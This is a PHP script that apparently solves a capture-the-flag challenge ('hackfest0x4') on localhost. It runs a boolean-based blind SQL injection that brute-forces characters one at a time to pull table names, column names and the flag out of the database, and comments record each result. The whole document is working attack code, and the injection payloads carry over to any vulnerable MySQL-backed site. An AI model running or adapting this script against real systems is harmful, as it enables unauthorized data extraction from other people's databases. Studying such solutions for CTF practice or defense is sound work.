<?php

function post_request($url, $data) {
	$handle = curl_init($url);
	
	curl_setopt($handle, CURLOPT_HEADER,         false);
	curl_setopt($handle, CURLOPT_USERAGENT,      'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36');
	curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($handle, CURLOPT_POST,           true);
	curl_setopt($handle, CURLOPT_POSTFIELDS,     $data);
	curl_setopt($handle, CURLOPT_TIMEOUT,        30);
	
	$page = curl_exec($handle);
	
	curl_close($handle);
	
	return array(
		'page' => $page
	);
}

echo "--START ATTACKING--\n";

$url = 'http://localhost/ws/blind/';

$id=1;
while(true){
	for ($i = 32; $i < 126; $i++) {
		$data = "submit=_Ch3K&cek=123";
		// GET TABLE
		$inject = "' and ascii(substring((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database()),".($id).",1)) = ".$i." -- -";
		//flag_123
		
		//GET COLOUMN
		$inject = "' and ascii(substring((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'flag_123'),".($id).",1)) = ".$i." -- -";
		//flag_321
		
		//GET FLAGGG
		$inject = "' and ascii(substring((SELECT GROUP_CONCAT(flag_321) FROM flag_123),".($id).",1)) = ".$i." -- -";
		//hackfest0x4{S3L4M4T_AnD4_LU7U5_17623}
		
		$send = post_request($url, $data.$inject);
		if (strpos($send['page'], 'Selamat Kamu dinyatakan LULUS') !== false) {
			$id++;
			echo chr($i);
		}
	}
}

?>